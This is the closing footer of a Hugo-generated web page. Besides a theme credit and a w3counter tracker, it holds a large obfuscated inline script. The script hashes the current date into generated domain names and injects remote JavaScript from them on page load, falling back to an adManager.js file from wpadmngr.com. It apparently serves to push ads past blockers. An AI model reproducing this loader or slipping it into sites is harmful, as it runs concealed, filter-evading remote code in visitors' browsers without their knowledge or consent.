			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>